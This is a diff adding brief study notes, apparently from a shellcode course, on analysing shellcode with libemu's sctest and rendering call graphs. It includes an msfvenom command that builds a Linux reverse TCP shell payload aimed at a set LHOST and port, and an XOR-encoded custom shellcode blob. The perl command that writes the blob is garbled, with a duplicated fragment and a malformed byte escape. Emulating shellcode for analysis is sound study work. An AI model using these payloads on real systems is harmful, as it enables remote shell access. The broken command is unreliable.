@@ -1,0 +1,11 @@
+For msf shellcode:
+
+slae@slae-virtual-machine:~/libemu/tools/sctest$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=3333 | sudo ./sctest -vvv -Ss 1000000 -G Shell_Reverse_TCP.dot > output.txt && dot Shell_Reverse_TCP.dot -Tpng -o Shell_Reverse_TCP.png
+
+
+For custom shellcode:
+
+perl -e 'print "\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa1a\xa1\x67\x2a"' > aaa.bin"' > aaa.bin 
+
+cat aaa.bin | sudo ./sctest -vvv -Ss 1000000 -G aaa.dot > output.txt && dot aaa.dot -Tpng -o aaa.png
+display aaa.png 
